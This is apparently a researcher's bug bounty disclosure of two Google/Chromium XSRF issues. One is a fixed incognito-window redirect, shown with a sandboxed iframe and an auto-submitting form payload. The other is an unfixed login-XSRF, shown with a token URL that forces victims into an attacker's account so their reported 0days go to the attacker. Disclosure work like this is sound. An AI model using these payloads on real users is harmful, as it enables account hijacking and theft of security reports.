# Go Incognito XSRF (Fixed, Awarded $3000)

`SignOutOptions` has a feature where it will open an Android incognito window to a custom URL that does not inherit the sandbox or close the file picker dialog (spoof)

```js
Frame = document.createElement('iframe');
Frame.sandbox = 'allow-popups allow-forms allow-scripts';
```

```html
<form
  action="https://accounts.google.com/SignOutOptions?continue=https://www.google.com/amp/a/s/ndev.tk/evil.html"
  method="post">
  <input type="submit" name="incognito" value="1" />
</form>
<script>
  document.querySelector('input').click();
</script>
```

The first patch used `google_util::IsGoogleAssociatedDomainUrl` thats bypassable since Google hosts user generated content on `gstatic.com` (via XSS), `storage.googleapis.com` (Storage buckets) and `googleusercontent.com` (`ip.bc.googleusercontent.com`), I did not verify if insecure `http://` pages work.

# Login XSRF (WONTFIX/INFEASIBLE)

Both issue trackers don't verify if the victim initiated the login which allows the attacker to force a login to their account, No `document.cookie =` needed :)

Some more examples...

- `https://flash.android.com/accounts/SetOSID?authuser=0&continue=https://flash.android.com/?pli%3D1%26authuser%3D0&osidt=<Token>`

Worth mentioning since the token is not connected to a session, browser extensions with the Tabs permission but no host permission gain account takeover; it's a feature.

Once the victim is on the attackers account any security issues reported via the standard <https://bugs.chromium.org/p/chromium/issues/wizard> page (ideally bookmarked) will be sent to the attackers email and if all goes well there be able to steal that 0day and get the reward (very unlikely) from Chromium VRP!

They are aware of the fact that login XSRF is possible in some cases. Unfortunately, they donâ€™t have a clear plan to fix it at this time.
